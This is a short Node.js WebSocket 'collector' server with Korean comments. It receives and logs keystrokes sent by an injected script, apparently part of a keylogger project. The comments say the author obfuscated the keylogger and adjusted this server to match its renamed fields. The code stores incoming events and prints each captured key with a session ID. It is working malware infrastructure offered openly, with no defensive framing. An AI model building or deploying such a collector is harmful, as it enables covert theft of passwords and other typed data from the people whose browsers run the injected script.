//웹소켓이 연결된 수집 서버(웹소켓 대기소? 느낌), injected.js가 주는 정보를 받는 곳
import { WebSocketServer } from "ws";

const port = process.env.PORT || 5000;

//웹소켓이라기보다는 서버 객체라고 이해하면 편하다. 외부에서 요청이 오는지 감시하는 감시자 객체임
const wss = new WebSocketServer({ port });//5000번 포트에 감시자? 객체 생성

console.log("COLLECTOR(WS) listening on ws://localhost:" + port);

const events = [];
const MAX_EVENTS = 2000;

wss.on("connection", (socket) => {  //connection이 발생하면 'socket'이라는 웹소켓 객체 생성
  console.log("[collector] client connected");

  //키로거 난독화하다가 변수랑 타입 좀 실수를 해가지고, 난독화중인 스크립트 수정하는건 너무 끔찍해서 그냥 서버쪽을 조금 수정했습니다.
  socket.on("message", (raw) => {
    try {
        const msg = JSON.parse(raw.toString("utf8"));
        events.push(msg);
        if (events.length > MAX_EVENTS) events.shift();

        // injected.js에서 쪼개서 보낸 키값들에 대응
        const et = msg?.type || "UNKNOWN"; // eventType -> type
        const sid = msg?.sid || "-";       // sessionId -> sid
    
        // "KE" + "Y_LOG" 타입 판별
        if (et === "KEY_LOG") {
          const key = msg?.val || "";      // key -> val
          console.log(`[collector] ${et} | SID: ${sid.slice(0, 8)} | Key: "${key}"`);
        }
    } catch (e) {
        console.log(`[collector] bad message (${e.message}):`, raw.toString("utf8").slice(0,120));
    }
  });
  //마찬가지로 닫힐때 콘솔 찍도록 콜백함수 예약
  socket.on("close", () => console.log("[collector] client disconnected"));
});
